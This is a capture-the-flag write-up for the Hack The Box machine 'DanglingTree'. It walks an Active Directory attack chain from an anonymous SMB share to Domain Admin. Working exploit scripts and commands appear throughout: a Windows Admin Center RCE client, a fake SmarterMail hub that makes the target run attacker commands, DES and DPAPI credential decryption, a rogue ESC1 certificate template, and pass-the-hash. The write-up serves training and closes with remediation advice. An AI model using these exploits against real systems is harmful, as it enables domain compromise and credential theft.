# HTB DanglingTree - WAC RCE, DPAPI Credential Chain, and ADCS ESC1 via a Ghost Certificate Template

**Difficulty:** Hard · **OS:** Windows Server 2025 · **Domain:** `danglingtree.htb` · **DC:** `dc.danglingtree.htb`

DanglingTree is a single-DC Active Directory box that rewards careful service enumeration over brute force. The chain is: an anonymously readable SMB share that leaks the first credential → authenticated RCE through Windows Admin Center (CVE-2026–26119) → a loopback-only SmarterMail instance abused for code execution as a service account (CVE-2026–23760) → a retained mail store whose passwords are weak DES → DPAPI decryption → an ACL misconfiguration (`ForceChangePassword`) → a *ghost* certificate template published on the CA but missing from the directory, turned into an ESC1 → Domain Admin. Two flags, one long but very clean chain. This is the most comprehensive write-up on the internet for solving this challenge.
- -
<p align="center">
  <img src="https://miro.medium.com/v2/resize:fit:1100/format:webp/1*wC0OOTtQbxHxa6oNrPg4Cw.png">
</p>

## 1. Enumeration
Standard AD port sweep:
```bash
nmap -sC -sV -p- - min-rate 2000 10.129.22.123 -oN nmap/full.txt
```
Key results:
```
53/tcp domain Simple DNS Plus
80/tcp http Microsoft IIS 10.0
88/tcp kerberos-sec Microsoft Windows Kerberos
135/139/445/593 RPC / SMB / RPC over HTTP
389/636/3268/3269 LDAP / LDAPS / GC
443/tcp https cert CN=danglingtree-DC-CA
3389/tcp ms-wbt-server
6600/tcp ssl <- Windows Admin Center
9389/tcp adws
```
Two things jump out immediately:
1. **`CN=danglingtree-DC-CA` on port 443** - the DC is also an Enterprise CA. ADCS will matter later.
2. **Port 6600** - that is Windows Admin Center (WAC), Microsoft's browser-based management plane. WAC executes PowerShell on a managed node *over PS Remoting as the authenticated user*, which turns "I know a password" into "I have a shell on the DC".
3. The `smb2-time`/clock-skew output shows a **7-hour clock skew**. Remember that: it will break Kerberos at the very last step.
Add the hostname and keep moving:
```bash
echo "10.129.22.123 dc.danglingtree.htb danglingtree.htb" | sudo tee -a /etc/hosts
```
- -
## 2. Foothold - the `IT` share hands over the first credential
SMB allows **null/guest authentication**, so enumerate shares anonymously first:
```bash
nxc smb 10.129.22.123 -u '' -p '' - shares
```
```
ADMIN$ C$ IPC$ IT NETLOGON SYSVOL
```
`IT` is non-standard. Connect as an anonymous user and recurse:
```bash
smbclient -N //10.129.22.123/IT
smb: \> recurse on; ls
smb: \> get Security\DanglingTree_RoE_Assessment.pdf
```
The PDF is a mock Rules-of-Engagement document - and it contains a **Provided Credentials** section:
```
anderson.w : R3dT3am@Acc3ss#01
```
> Note the quirk that makes this step easy to miss: the `IT` share grants anonymous access but **denies authenticated low-privilege domain users**. Enumerate shares with a null session *before* you have credentials.
- -
## 3. RCE as `anderson.w` through Windows Admin Center (CVE-2026–26119)
WAC does not accept a plain form post. Its login is a four-step handshake:
1. `GET /` → scrape the anti-forgery token (`id="csrf" value="…"`)
2. `POST /api/user/key` with that token → the gateway returns an **RSA public key as a JWK**
3. Encrypt `{"username","password","csrf"}` with **RSA-OAEP/SHA-256** and base64 it
4. `POST /api/user/login` with `{packet, csrf}` → you get `WAC-SESSION` and `XSRF-TOKEN`
Then execution is a single call to the WinREST PowerShell endpoint:
```
POST /api/services/WinREST/PowerShell/nodes/dc/invokeCommand
Header: x-xsrf-token: <XSRF-TOKEN>
{"properties":{"script":"<powershell>","command":"x","module":"",
 "state":"ready","useInProcRunspace":false,"invokeMode":"Polling"}}
```
A compact client:
```python
#!/usr/bin/env python3
import base64, json, re, requests
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.asymmetric import padding, rsa
BASE = "https://10.129.22.123:6600"
def b64u(s): return base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))
def login(user, pw):
 s = requests.Session(); s.verify = False
 csrf = re.search(r'id="csrf" value="([^"]+)"', s.get(BASE + "/").text).group(1)
 jwk = s.post(BASE + "/api/user/key", json={"csrf": csrf}).json()["jwk"]
 n = int.from_bytes(b64u(jwk["n"]), "big"); e = int.from_bytes(b64u(jwk["e"]), "big")
 pub = rsa.RSAPublicNumbers(e, n).public_key()
 data = json.dumps({"username": user, "password": pw, "csrf": csrf}).encode()
 pkt = base64.b64encode(pub.encrypt(data, padding.OAEP(
 mgf=padding.MGF1(hashes.SHA256()), algorithm=hashes.SHA256(), label=None))).decode()
 r = s.post(BASE + "/api/user/login", json={"packet": pkt, "csrf": csrf})
 assert r.status_code == 200 and s.cookies.get("XSRF-TOKEN")
 s.headers["x-xsrf-token"] = s.cookies["XSRF-TOKEN"]
 return s
def run(s, cmd):
 url = BASE + "/api/services/WinREST/PowerShell/nodes/dc/invokeCommand"
 j = s.post(url, json={"properties": {"script": cmd, "command": "x", "module": "",
 "state": "ready", "useInProcRunspace": False, "invokeMode": "Polling"}}).json()
 return "\n".join(str(x) for x in (j.get("results") or []))
```
```python
s = login("anderson.w", "R3dT3am@Acc3ss#01")
print(run(s, "whoami; hostname"))
# danglingtree\anderson.w
# dc
```
**Why this works:** `anderson.w` is a member of `BUILTIN\Remote Management Users`, which is exactly what WinRM checks. WAC is not a privilege escalation by itself - it is a proxy that turns domain credentials into PowerShell on the DC, on a port that is reachable while 5985 is filtered.
`anderson.w` is still a nobody: no service control, no admin shares, empty profile. The DC's user profiles, however, reveal accounts the directory hides: `noah.b`, `svc_mail`, `Administrator`.
- -
## 4. Second foothold - SmarterMail `connect-to-hub` (CVE-2026–23760)
`netstat -ano` shows an unexpected listener:
```
0.0.0.0:17017 LISTENING <- SmarterMail management API
127.0.0.1:25/110/143 <- SMTP / POP3 / IMAP (loopback only)
```
Port 17017 is not exposed externally, but we are *inside* the boundary now. SmarterMail's high-availability endpoint accepts an unauthenticated **`connect-to-hub`** request and applies the cluster configuration returned by the address you supply. The response includes a `SystemMount` block; when `MountPath` does not exist, the service runs `CommandMount` to bring the mount online - as the service account (`svc_mail`).
Stand up a fake hub on your attack box:
```python
#!/usr/bin/env python3
# fake_hub.py "<command>" [port] - serves a SystemMount with a UNIQUE nonexistent MountPath
import json, sys, uuid
from http.server import BaseHTTPRequestHandler, HTTPServer
CMD = sys.argv[1]
class H(BaseHTTPRequestHandler):
 def do_POST(self):
 self.rfile.read(int(self.headers.get("Content-Length", 0)))
 body = json.dumps({
 "ClusterID": str(uuid.uuid4()), "SharedSecret": "pwnd",
 "TargetHubs": {"a": "b"}, "IsStandby": False,
 "SystemMount": {"Enabled": True, "ReadOnly": False,
 "MountPath": "C:\\smpwn_" + uuid.uuid4().hex[:8],
 "CommandMount": CMD, "UseArgumentsInCommand": False},
 "SystemAdminUsernames": ["svc_mail"]}).encode()
 self.send_response(200); self.send_header("Content-Type", "application/json")
 self.send_header("Content-Length", str(len(body))); self.end_headers(); self.wfile.write(body)
 def log_message(self, *a): pass
HTTPServer(("0.0.0.0", int(sys.argv[2]) if len(sys.argv) > 2 else 8082), H).serve_forever()
```
Trigger it through our WAC shell and read the output file back:
```powershell
$b = @{ hubAddress='http://10.10.16.86:8082'; oneTimePassword='x'; nodeName='dc' } | ConvertTo-Json -Compress
Invoke-WebRequest -Uri 'http://127.0.0.1:17017/api/v1/settings/sysadmin/connect-to-hub' `
 -Method POST -Body $b -ContentType 'application/json' -UseBasicParsing
```
```bash
python3 fake_hub.py "cmd /c whoami > C:\ProgramData\svc_out.txt 2>&1" 8082
# then, via WAC:
[IO.File]::ReadAllText('C:\ProgramData\svc_out.txt')
# danglingtree\svc_mail
```
Two gotchas worth knowing: the mount deliberately **fails** ("Failed to mount" / `"success":false`) *after* running the command - that is expected, not a failure of the exploit. And read output with `[IO.File]::ReadAllText()`, never through `cmd /c type`, because the WAC PowerShell channel tries to parse child-process stdout as CLIXML.
- -
## 5. Cracking the retained mail store
With `svc_mail` code execution we can finally read `C:\SmarterMail`. The live domain has a single mailbox, but there is a **retained backup** of the old domain:
```
C:\SmarterMail\Domains\danglingtree.htb.bak\Users\
 amelia.r emma.s liam.m noah.b oliver.t sophia.k svc_mail
```
`noah.b\settings.json` leaks a password field that is **encrypted, not hashed**:
```json
"password_encrypted": "66e7ppLOBF7UdzDv7zK6MJ1rmyUb1Cby"
```
32 base64 characters → 24 bytes, so not AES. The SmarterMail assemblies (`SmarterMail.Standard.dll`, `MailService.dll`) reveal the scheme in `SmarterMail.Standard.Utilities.CryptographyHelper`: **DES** with two hard-coded key/IV pairs (`keymap1`/`keymap2`) selected by a magic key string. The method used for mailbox passwords is:
```csharp
CryptographyHelper.DecodeFromBase64(0, "a3oij89FF!apoife", password_encrypted) // 0 = DES
```
The static key material lives in `FieldRVA` blobs (a simple `strings` search will not show it). Extract it from the PE metadata and decrypt:
```python
from Cryptodome.Cipher import DES
from Cryptodome.Util.Padding import unpad
import base64
key = bytes.fromhex("b43f84d110b4e991") # keymap2 from the assembly's FieldRVA data
iv = bytes.fromhex("01d8aee649ad9227")
ct = base64.b64decode("66e7ppLOBF7UdzDv7zK6MJ1rmyUb1Cby")
print(unpad(DES.new(key, DES.MODE_CBC, iv).decrypt(ct), 8).decode())
# RiverDragon#Storm25
```
`noah.b` is a plain domain user, but the password is reused in the operator's Credential Manager.
- -
## 6. DPAPI - decrypting `noah.b`'s stored credential
Because we can run processes as `noah.b` (his credentials are now known), the quickest path is to ask Windows for his stored credentials:
```powershell
cmdkey /list
# Target: Domain:target=PC01.danglingtree.htb
# Type: Domain Password
# User: alex.o
```
The secret itself is DPAPI-protected. Exfiltrate the blob and the user's master key, then decrypt offline with Impacket:
```powershell
Get-ChildItem "$env:APPDATA\Microsoft\Credentials" -Force |
 ForEach-Object { [Convert]::ToBase64String([IO.File]::ReadAllBytes($_.FullName)) }
Get-ChildItem "$env:APPDATA\Microsoft\Protect" -Recurse -Force -File |
 ForEach-Object { [Convert]::ToBase64String([IO.File]::ReadAllBytes($_.FullName)) }
```
```bash
dpapi.py masterkey -file f53fcaba-… -sid S-1–5–21–4220238332–57023728–1129110646–1602 \
 -password 'RiverDragon#Storm25'
# Decrypted key: 0x7120d9ad…
dpapi.py credential -file 57FFB67D684C67F09E7153B9C7CC3940 -key 0x7120d9ad…
# Username : alex.o
# Unknown : SunsetMountainPeak@2025
```
So the box's "dangling" credential target is a machine (`PC01`) that no longer exists - but the **username and password are still valid domain credentials**: `alex.o : SunsetMountainPeak@2025`.
- -
## 7. ACL abuse - `ForceChangePassword` over `jake.h`
`alex.o` is a member of `SUPPORT-IT`, and that group holds the `User-Force-Change-Password` extended right on `jake.h`. Reset his password:
```bash
bloodyAD - host 10.129.22.123 -d danglingtree.htb -u alex.o -p 'SunsetMountainPeak@2025' \
 set password jake.h 'R3dT3am@Acc3ss#02'
# [+] Password changed successfully!
```
`jake.h` is the interesting account:
```
jake.h -> DevOps_PKI, Template_Editors, Helpdesk_Cert_Support
Helpdesk_Cert_Support -> Remote Management Users, Remote Desktop Users
```
`Template_Editors` is the key. Enumerate ADCS as `jake.h`:
```bash
certipy find -u jake.h@danglingtree.htb -p 'R3dT3am@Acc3ss#02' -dc-ip 10.129.22.123 -vulnerable -stdout
```
```
[!] Vulnerabilities
 ESC7 : User has dangerous permissions. # Helpdesk_Cert_Support has ManageCertificates on the CA
```
No template-level ESC fires - the CA has `User Specified SAN: Disabled`, and the templates that *do* allow SAN (`SubCA`, `OfflineRouter`) are enrollable only by Domain Admins. The way in is the CA's `certificateTemplates` attribute.
- -
## 8. Ghost templates → ESC1 → Administrator certificate
The CA publishes more template names than exist in the directory:
```
Published : RemoteAccessVPN, EmployeeAuthTemplate, VPNUserTemplate,
 DirectoryEmailReplication, DomainControllerAuthentication, …, SubCA, Administrator
Existing : 33 pKICertificateTemplate objects
GHOSTS : RemoteAccessVPN, EmployeeAuthTemplate, VPNUserTemplate
```
Those three are **ghost templates** - names registered on the CA with no backing object. `jake.h` (via `Template_Editors`) has `CREATE_CHILD` on `CN=Certificate Templates`, so we can simply **create the missing object** with malicious settings and the CA will accept it without any modification.
Create it with `EnrolleeSuppliesSubject` (SAN in the request) and a Client Authentication EKU:
```python
# rogue_template.py - run as jake.h
DN = ("CN=EmployeeAuthTemplate,CN=Certificate Templates,CN=Public Key Services,"
 "CN=Services,CN=Configuration,DC=danglingtree,DC=htb")
attrs = {
 "objectClass": ["top", "pKICertificateTemplate"],
 "cn": "EmployeeAuthTemplate", "displayName": "EmployeeAuthTemplate",
 "flags": 66257, "revision": 5, "showInAdvancedViewOnly": True,
 "msPKI-Template-Schema-Version": 1, "msPKI-Template-Minor-Revision": 1,
 "msPKI-Certificate-Name-Flag": 1, # ENROLLEE_SUPPLIES_SUBJECT ← ESC1
 "msPKI-Enrollment-Flag": 0, "msPKI-RA-Signature": 0,
 "msPKI-Private-Key-Flag": 16, "msPKI-Minimal-Key-Size": 2048,
 "msPKI-Cert-Template-OID": "1.3.6.1.4.1.311.21.8.<CA-OID-prefix>.1.20",
 "pKIDefaultCSPs": "1,Microsoft Enhanced Cryptographic Provider v1.0",
 "pKIDefaultKeySpec": 2, "pKIMaxIssuingDepth": -1,
 "pKIKeyUsage": b"\x86\x00",
 "pKICriticalExtensions": ["2.5.29.15", "2.5.29.19"],
 "pKIExtendedKeyUsage": ["1.3.6.1.5.5.7.3.2", "1.3.6.1.4.1.311.20.2.2"],
}
c.add(DN, object_class=["top", "pKICertificateTemplate"], attributes=attrs)
```
The new object inherits a restrictive DACL, so grant ourselves enrollment:
```bash
bloodyAD - host 10.129.22.123 -d danglingtree.htb -u jake.h -p 'R3dT3am@Acc3ss#02' \
 add genericAll 'CN=EmployeeAuthTemplate,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=danglingtree,DC=htb' 'jake.h'
```
Now request a certificate **as the domain Administrator** (UPN and SID injected through the SAN):
```bash
certipy req -u jake.h@danglingtree.htb -p 'R3dT3am@Acc3ss#02' -dc-ip 10.129.22.123 \
 -ca 'danglingtree-DC-CA' -target dc.danglingtree.htb -template EmployeeAuthTemplate \
 -upn 'Administrator@danglingtree.htb' \
 -sid 'S-1–5–21–4220238332–57023728–1129110646–500'
```
```
[*] Successfully requested certificate
[*] Got certificate with UPN 'Administrator@danglingtree.htb'
[*] Certificate object SID is 'S-1–5–21-…-500'
[*] Saving certificate and private key to 'administrator.pfx'
```
- -
## 9. PKINIT - and the clock skew that bites
Authenticate with the certificate to obtain the Administrator's TGT and NT hash:
```bash
certipy auth -pfx administrator.pfx -dc-ip 10.129.22.123
# [-] Got error while trying to request TGT: KRB_AP_ERR_SKEW(Clock skew too great)
```
This is the 7-hour skew nmap warned about. Without root you cannot change the system clock, but you can shift it for a single process with `libfaketime` (measured skew here: **+428 minutes**):
```bash
export FT=$(python3 -c "import libfaketime,os;print(os.path.join(os.path.dirname(libfaketime.__file__),'vendor/libfaketime/src/libfaketime.so.1'))")
LD_PRELOAD="$FT" FAKETIME="+428m" DONT_FAKE_MONOTONIC=1 \
 certipy auth -pfx administrator.pfx -dc-ip 10.129.22.123
```
```
[*] Got TGT
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@danglingtree.htb':
```
- -
## 10. Flags
Pass-the-hash and read both flags. (NTLM ignores clock skew, so no faketime here.)
```bash
H='aad3b435b51404eeaad3b435b51404ee:8cacb3a97e460c65d105ca7cd9913925'
wmiexec.py -hashes "$H" administrator@10.129.22.123 \
 "cmd /c type C:\Users\noah.b\Desktop\user.txt"
wmiexec.py -hashes "$H" administrator@10.129.22.123 \
 "cmd /c type C:\Users\Administrator\Desktop\root.txt"
```
- -
## 11. Attack-path summary
```
Anonymous SMB (guest) ──► IT share ──► RoE PDF ──► anderson.w:R3dT3am@Acc3ss#01
 │
 ▼
WAC :6600 (CVE-2026–26119) ──► RCE as anderson.w (Remote Management Users)
 │
 ▼
SmarterMail :17017 connect-to-hub (CVE-2026–23760) ──► RCE as svc_mail
 │
 ▼
danglingtree.htb.bak mail store ──► noah.b password_encrypted (DES keymap2)
 │ └─► RiverDragon#Storm25
 ▼
noah.b Credential Manager (DPAPI) ──► alex.o:SunsetMountainPeak@2025
 │
 ▼
SUPPORT-IT ForceChangePassword on jake.h ──► jake.h:R3dT3am@Acc3ss#02
 │
 ▼
Template_Editors + CREATE_CHILD ──► ghost template EmployeeAuthTemplate (ESC1)
 │
 ▼
Administrator certificate ──► PKINIT ──► NT hash ──► DCSync / pass-the-hash ──► flags
```
## 12. Remediation
- Remove anonymous/guest access from SMB shares and never store credentials in documents; audit share ACLs, especially inverted ones (anonymous allowed, authenticated denied).
- Do not expose Windows Admin Center on a non-standard port without MFA; patch CVE-2026–26119 and restrict WAC to dedicated admin workstations.
- Patch/segment SmarterMail (CVE-2026–23760); the `connect-to-hub` endpoint must require authentication.
- Delete retained/backup mail stores containing stale `password_encrypted` values, and migrate away from DES-based password storage.
- Enforce LDAP signing and channel binding; audit ACLs for `ForceChangePassword`/`GenericAll` grants on privileged accounts.
- Monitor the CA: `certificateTemplates` names without a corresponding template object ("ghost templates"), and `ManageCertificates`/`ManageCA` delegated to non-PKI groups.
- Keep domain controllers time-synchronized - and remember that skew is an attacker obstacle, not a control.
## References
- Microsoft Windows Admin Center - CVE-2026–26119 (authenticated RCE via WinREST `invokeCommand`)
- SmarterMail `connect-to-hub` - CVE-2026–23760
- [Certipy](https://github.com/ly4k/Certipy) · [Impacket](https://github.com/fortra/impacket) · [bloodyAD](https://github.com/CravateRouge/bloodyAD)
